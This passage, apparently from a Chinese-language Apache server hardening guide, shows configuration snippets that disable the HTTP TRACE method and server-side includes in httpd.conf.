修改 httpd.conf 配置文件，修改或添加以下配置（仅适用于**Apache** 2.0以上版本）：

```
TraceEnable Off
```

**9. 禁用 SSI** 修改 httpd.conf 配置文件，注释相关模块及配置：

```
#LoadModule include_module modules/mod_include.so
<Directory "/var/www/html">
    Options Indexes FollowSymLinks -Includes  AllowOverride None
    Order allow,deny
    allow from all
</Directory>
```

***
